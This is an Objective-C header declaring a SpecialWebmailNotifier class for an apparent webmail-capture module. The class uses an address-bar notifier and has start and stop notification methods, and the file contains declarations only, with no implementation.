//
//  SpecialWebmailNotifier.h
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/23/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "PageVisitedDelegate.h"

@class AddressBarValueNotifier;

@interface SpecialWebmailNotifier : NSObject <PageVisitedDelegate> {
    id mDelegate;
    SEL mSelector;
    
    AddressBarValueNotifier *mUrlNotifier;
}

@property (nonatomic, assign) id mDelegate;
@property (nonatomic, assign) SEL mSelector;

- (void) startNotify;
- (void) stopNotify;

@end
